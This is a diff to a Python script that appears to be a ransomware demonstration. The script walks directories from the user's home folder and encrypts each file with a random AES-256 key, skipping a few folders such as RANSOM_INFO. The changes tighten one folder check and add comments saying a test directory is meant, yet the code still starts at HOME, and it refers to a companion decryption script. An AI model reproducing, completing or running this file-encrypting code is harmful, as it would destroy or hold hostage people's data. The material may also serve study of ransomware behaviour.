@@ -59,7 +59,7 @@ def traverse_files(nwd, aes_key, depth):
             req1 = 'Home' in os.path.basename(os.path.normpath(path))
             req2 = 'home' in os.path.basename(os.path.normpath(path))
             req3 = 'RANSOM_INFO' in os.path.basename(os.path.normpath(path))
-            req4 = 'techdemo' in os.path.basename(os.path.normpath(path))
+            req4 = 'techdemo' == os.path.basename(os.path.normpath(path))
 
             if not os.path.isdir(path):
                 encrypt_file(aes_key, path)
@@ -124,10 +124,13 @@ def main():
     #use it for encrypting individual files
     #represented in bytes 32 bytes = 256 bits
     aes_key = os.urandom(32)
-
-    #start from the home directory, pass it to the traverse function
-    #the starting directory could easily be changed
+    
+    #for this example, we will just use a test directory
+    #start from the test directory, pass it to the traverse function
+    #the starting directory could easily be changed, just make sure you change 
+    #  change the corresponding line in R-Decryption.py
     home = os.environ['HOME']
+    #test_dir = os.path.join()
     
     #print(home + "\n")
     
